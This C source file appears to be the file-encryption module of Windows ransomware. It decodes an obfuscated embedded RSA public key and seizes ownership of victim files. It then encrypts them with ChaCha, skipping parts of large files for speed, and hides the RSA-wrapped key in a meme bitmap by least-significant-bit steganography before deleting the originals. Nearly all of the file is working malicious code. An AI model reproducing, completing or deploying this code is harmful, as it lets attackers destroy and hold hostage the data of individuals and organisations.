#include "Crypto.h"
BYTE publicKeyBlob[532] = { 127, 99, 121, 101, 101, 208, 121, 97, 43, 54, 36, 69, 121, 113, 121, 101, 100, 116, 120, 97, 176, 82, 225, 42, 32, 40, 90, 144, 61, 192, 82, 130, 10, 12, 36, 168, 166, 101, 210, 150, 35, 20, 27, 143, 20, 47, 70, 242, 28, 235, 217, 89, 164, 84, 191, 230, 237, 147, 73, 179, 71, 219, 97, 222, 128, 231, 20, 234, 74, 16, 243, 248, 109, 38, 28, 122, 190, 18, 15, 66, 46, 237, 138, 205, 40, 52, 70, 175, 75, 4, 216, 150, 127, 152, 117, 60, 105, 10, 3, 145, 210, 57, 115, 25, 170, 106, 119, 86, 227, 162, 66, 176, 169, 155, 129, 241, 144, 252, 10, 21, 194, 119, 26, 115, 223, 111, 110, 201, 70, 40, 156, 98, 23, 210, 108, 52, 200, 78, 137, 133, 210, 18, 137, 25, 106, 213, 103, 204, 134, 135, 63, 250, 75, 123, 53, 231, 38, 220, 196, 96, 158, 172, 28, 251, 182, 9, 10, 204, 81, 42, 210, 27, 191, 194, 83, 157, 212, 100, 205, 6, 110, 21, 214, 169, 98, 107, 168, 198, 231, 170, 99, 84, 48, 73, 237, 225, 19, 250, 112, 32, 233, 209, 151, 234, 113, 164, 235, 152, 87, 78, 219, 155, 87, 245, 119, 111, 238, 116, 92, 186, 115, 99, 189, 69, 251, 71, 45, 47, 18, 39, 96, 27, 226, 127, 71, 8, 1, 236, 143, 7, 5, 41, 160, 43, 109, 95, 213, 252, 244, 215, 206, 120, 243, 168, 108, 36, 27, 61, 108, 120, 4, 149, 152, 194, 127, 79, 6, 106, 57, 17, 153, 179, 213, 243, 81, 235, 202, 129, 136, 28, 234, 192, 246, 76, 211, 49, 143, 56, 20, 169, 1, 110, 207, 128, 230, 34, 116, 163, 29, 81, 155, 11, 250, 214, 58, 255, 148, 123, 7, 197, 210, 164, 179, 150, 35, 74, 155, 169, 158, 187, 137, 101, 143, 200, 105, 48, 162, 223, 18, 98, 236, 243, 216, 164, 15, 28, 96, 162, 113, 178, 46, 175, 145, 211, 150, 45, 197, 75, 223, 110, 14, 209, 58, 142, 67, 172, 127, 2, 201, 219, 5, 45, 198, 43, 228, 226, 75, 215, 109, 66, 195, 142, 141, 47, 32, 205, 232, 148, 15, 27, 180, 115, 157, 163, 176, 137, 251, 222, 194, 33, 30, 254, 114, 67, 147, 155, 49, 90, 171, 21, 205, 97, 200, 255, 17, 93, 201, 248, 157, 107, 164, 64, 33, 109, 231, 46, 231, 109, 252, 239, 62, 180, 235, 148, 79, 202, 75, 6, 191, 36, 53, 88, 143, 93, 196, 198, 234, 214, 237, 166, 112, 33, 132, 181, 66, 12, 17, 123, 128, 72, 126, 192, 38, 238, 193, 251, 103, 120, 60, 70, 171, 46, 80, 128, 185, 47, 104, 163, 42, 18, 16, 125, 174, 246, 192, 254, 199, 13, 48, 106, 200, 9, 197, 168, 38, 108, 69, 181, 195, 145, 87, 52, 55, 71, 100, 174, 188, 152, 4, 64, 130, 134, 85, 55, 225, 233, 181, 42, 0, 221, 141, 16, 183, 94, 1, 223, 70, 246, 118, 148, 140, 109, 255, 119, 71, 202, 11, 53, 127, 0, 179, 221 };
BYTE memeHeader[16] = { 0x42, 0x4D, 0xCA, 0x67, 0x04, 00, 00, 00, 00, 00, 0xCA, 00, 00, 00, 0x7C, 00 };
LPCSTR memePath = NULL;

// make sure key and nonce are already allocated
int generateKeyNonce(HCRYPTPROV hCryptProv, BYTE* key, BYTE* nonce) {
	if (CryptGenRandom(hCryptProv, 256, key) == FALSE) {
		return -1;
	}
	if (CryptGenRandom(hCryptProv, 8, nonce) == FALSE) {
		return -1;
	}
	return 0;
}

int extractResource() {
	LPSTR lpTemp;
	DWORD dwSizeOfResource;
	HMODULE hFile = NULL;
	HRSRC hResource;
	HGLOBAL hgResource;
	LPVOID lpResource;
	HANDLE duckFile = NULL;
	DWORD writeBytes = 0;
	int return_val = -1;
	lpTemp = (LPSTR)calloc(MAX_PATH, 1);
	if (!lpTemp) {
		goto CLEANUP;
	}

	if (!GetTempPathA(MAX_PATH, lpTemp)) {
		goto CLEANUP;
	}

	strcat(lpTemp, "memeFile.bmp");
	memePath = (LPCSTR)calloc(strlen(lpTemp) + 1, 1);
	if (!memePath) {
		goto CLEANUP;
	}
	strcpy((char*)memePath, lpTemp);


	if (PathFileExistsA(memePath)) {
		return_val = 0;
		goto CLEANUP;
	}


	hFile = GetModuleHandleA(NULL);
	if (hFile == INVALID_HANDLE_VALUE || !hFile) {
		goto CLEANUP;
	}


	hResource = FindResourceA(
		hFile,
		MAKEINTRESOURCEA(101),
		"YEET"
	);

	if (!hResource) {
		goto CLEANUP;
	}

	dwSizeOfResource = SizeofResource(NULL, hResource);
	if (dwSizeOfResource == 0) {
		goto CLEANUP;
	}

	hgResource = LoadResource(
		NULL,
		hResource
	);

	if (!hgResource) {
		goto CLEANUP;
	}


	lpResource = LockResource(hgResource);
	if (!lpResource) {
		goto CLEANUP;
	}

	duckFile = CreateFileA(memePath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	if (duckFile == INVALID_HANDLE_VALUE || duckFile == 0) {
		goto CLEANUP;
	}

	if (WriteFile(duckFile, lpResource, dwSizeOfResource, &writeBytes, NULL) == FALSE) {
		goto CLEANUP;
	}

	if (writeBytes != dwSizeOfResource) {
		goto CLEANUP;
	}

	return_val = 0;
CLEANUP:
	if (lpTemp) {
		free(lpTemp);
	}
	if (duckFile) {
		CloseHandle(duckFile);
	}
	return return_val;
}

int cryptInit() {
	const char* decryptKey = "yayeet";
	for (int i = 0; i < 532; i++) {
		publicKeyBlob[i] = publicKeyBlob[i] ^ decryptKey[i % strlen(decryptKey)];
	}
	if (extractResource() == -1) {
		return -1;
	}
	return 0;
}


void cryptCleanUp() {
	if (memePath) {
		free((void*)memePath);
	}
}

// Make sure key size is 256, nonce size is 8
// anything less than 10mb. Encrypt full -> time from 0ms to 92ms
int chachaFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce) {
	static BYTE buffer[2][CHACHA_BLOCKLENGTH * 1024];

	CHACHA_CONTEXT context;
	DWORD byteRead;
	DWORD byteWrite;
	chachaKeySetup(&context, key);
	chachaNonceSetup(&context, nonce);

	SetFilePointer(hFileIn, 0, 0, FILE_BEGIN);
	SetFilePointer(hFileOut, 0, 0, FILE_END);

	for (;;) {
		if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
			return -1;
		}

		chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
		if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
			return -1;
		}
		if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
			break;
		}
	}
	return 0;
}

// 10mb to 100mb -> only encrypt half the files -> time from 45ms to 500ms
int chachaMediumFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce) {
	static BYTE buffer[2][CHACHA_BLOCKLENGTH * 1024];
	DWORD dwMaxLengthEncrypt = GetFileSize(hFileIn, NULL) / 2;
	CHACHA_CONTEXT context;
	DWORD byteRead;
	DWORD byteWrite;
	chachaKeySetup(&context, key);
	chachaNonceSetup(&context, nonce);

	SetFilePointer(hFileIn, 0, 0, FILE_BEGIN);
	SetFilePointer(hFileOut, 0, 0, FILE_END);
	DWORD totalRead = 0;
	for (;;) {
		if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
			return -1;
		}

		chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
		if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
			return -1;
		}

		totalRead += byteRead;
		if (totalRead > dwMaxLengthEncrypt) {
			break;
		}

		if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
			break;
		}
	}

	for (;;) {
		if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
			return -1;
		}
		if (WriteFile(hFileOut, buffer[0], byteRead, &byteWrite, NULL) == FALSE) {
			return -1;
		}
		if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
			break;
		}
	}
	return 0;
}

// anything above 100mb. Limit to 1.5 seconds
// NOTE TO SELF: limit this down to 1 second
int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce) {
	static BYTE buffer[2][CHACHA_BLOCKLENGTH * 1024];
	DWORD fileSize = GetFileSize(hFileIn, NULL);
	DWORD dwEncryptBlockSize = ((1500.0 / 9240.0) * fileSize) / 3.0;
	DWORD dwSkipLength = (fileSize - 3 * dwEncryptBlockSize) / 2;

	CHACHA_CONTEXT context;
	DWORD byteRead;
	DWORD byteWrite;
	chachaKeySetup(&context, key);
	chachaNonceSetup(&context, nonce);

	SetFilePointer(hFileIn, 0, 0, FILE_BEGIN);
	SetFilePointer(hFileOut, 0, 0, FILE_END);
	DWORD totalRead = 0;

	for (int i = 0; i < 3; i++) {
		DWORD totalReadBlock = 0;
		if (i == 2) {
			for (;;) {
				if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
					return -1;
				}

				chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
				if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
					return -1;
				}
				if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
					break;
				}
			}
		}
		else {
			while (TRUE) {
				if (totalReadBlock + CHACHA_BLOCKLENGTH * 1024 > dwEncryptBlockSize) {
					break;
				}
				if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
					return -1;
				}
				chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
				if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
					return -1;
				}
				totalReadBlock += byteRead;
			}

			DWORD temp = 0;
			DWORD maxRead = (totalReadBlock + CHACHA_BLOCKLENGTH * 1024 - dwEncryptBlockSize) + dwSkipLength;

			BYTE* tempBuffer = (BYTE*)calloc(maxRead, 1);

			if (ReadFile(hFileIn, tempBuffer, maxRead, &byteRead, NULL) == FALSE) {
				return -1;
			}
			if (WriteFile(hFileOut, tempBuffer, maxRead, &byteWrite, NULL) == FALSE) {
				return -1;
			}
			free(tempBuffer);
		}
	}
	return 0;
}

DWORD getLengthString(LPCSTR oriFileName) {
	DWORD i = 0;

	while (1) {
		if (!oriFileName[i]) {
			break;
		}
		i++;
	}
	return i;
}

int encryptKey(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, HANDLE encryptedFile, BYTE* key, BYTE* nonce) {
	SetFilePointer(encryptedFile, 10, 0, FILE_BEGIN);
	BYTE* keyBuffer = NULL;
	DWORD dataLength = 256 + 8;
	DWORD fileOffset = 0;
	BYTE* imageBuffer = NULL;
	DWORD byteRead = 0;
	keyBuffer = (BYTE*)calloc(524, 1);
	if (!keyBuffer) {
		goto CLEANUP;
	}
	memcpy(keyBuffer, key, 256);
	memcpy(keyBuffer + 256, nonce, 8);


	if (CryptEncrypt(publicKey, NULL, TRUE, 0, keyBuffer, &dataLength, 524) == FALSE) {
		goto CLEANUP;
	}

	if (ReadFile(encryptedFile, &fileOffset, 4, &byteRead, NULL) == FALSE) {
		goto CLEANUP;
	}

	imageBuffer = (BYTE*)calloc(dataLength * 8, 1);

	if (!imageBuffer) {
		goto CLEANUP;
	}
	SetFilePointer(encryptedFile, fileOffset + 1, 0, FILE_BEGIN);

	if (ReadFile(encryptedFile, imageBuffer, dataLength * 8, &byteRead, NULL) == FALSE) {
		goto CLEANUP;
	}

	if (byteRead != dataLength * 8) {
		goto CLEANUP;
	}

	for (DWORD i = 0; i < dataLength; i++) {
		BYTE currentByte = keyBuffer[i];
		for (int j = 0; j < 8; j++) {
			imageBuffer[i * 8 + j] &= 0xFE;
			if ((currentByte & 1) == 1) {
				imageBuffer[i * 8 + j] += 1;
			}
			currentByte >>= 1;
		}
	}

	SetFilePointer(encryptedFile, fileOffset + 1, 0, FILE_BEGIN);
	if (WriteFile(encryptedFile, imageBuffer, dataLength * 8, &byteRead, NULL) == FALSE) {
		goto CLEANUP;
	}


CLEANUP:
	if (imageBuffer) {
		free(imageBuffer);
	}
	if (keyBuffer) {
		free(keyBuffer);
	}
	return 0;
}

int fileEncrypt(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPCSTR oriFileName, BYTE* key, BYTE* nonce) {
	killFileOwner((LPSTR)oriFileName);

	HANDLE inFile = CreateFileA(oriFileName, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD fileSizeHigh = 0;
	DWORD fileSize = GetFileSize(inFile, &fileSizeHigh);

	long long realFileSize = ((long long)fileSizeHigh << 32) | fileSize;

	DWORD lenName = getLengthString((CHAR*)oriFileName);
	HANDLE outFile = NULL;
	CHAR* newFileName;
	DWORD sizeFlag = 0;
	DWORD returnValue = -1;
	BYTE fileHeader[16] = { 0 };

	if (inFile == INVALID_HANDLE_VALUE) {
		return -1;
	}


	newFileName = (CHAR*)calloc(lstrlenA(oriFileName) + 5, 1);

	if (!newFileName) {
		goto CLEANUP;
	}

	newFileName = (CHAR*)memmove(newFileName, oriFileName, lstrlenA(oriFileName));

	(CHAR*)memmove(newFileName + lstrlenA(oriFileName), ".bmp", lstrlenA(".bmp"));

	if (ReadFile(inFile, fileHeader, 16, NULL, NULL)) {
		if (!memcmp(fileHeader, memeHeader, 16)) {
			printf("File already encrypted\n");
			goto CLEANUP;
		}
	}

	if (CopyFileA(memePath, newFileName, FALSE) == FALSE) {
		goto CLEANUP;
	}
	if (realFileSize > 10485760 && realFileSize < 104857600) {
		sizeFlag = 1;
	}
	else if (realFileSize >= 104857600) {
		sizeFlag = 2;
	}
	else {
		sizeFlag = 0;
	}
	if (outFile == INVALID_HANDLE_VALUE) {
		goto CLEANUP;
	}
	if (sizeFlag == 0) {
		outFile = CreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		chachaFileEncrypt(inFile, outFile, key, nonce);
	}
	else if (sizeFlag == 1) {
		outFile = CreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		chachaMediumFileEncrypt(inFile, outFile, key, nonce);
	}
	else {
		outFile = CreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		chachaLargeFileEncrypt(inFile, outFile, key, nonce);
	}

	encryptKey(hCryptProv, publicKey, outFile, key, nonce);
	returnValue = 0;
CLEANUP:
	if (newFileName) {
		free(newFileName);
	}
	if (inFile) {
		CloseHandle(inFile);

		if (returnValue == 0) {
			DeleteFileA(oriFileName);
		}
	}
	if (outFile) {
		CloseHandle(outFile);
	}
	return returnValue;
}

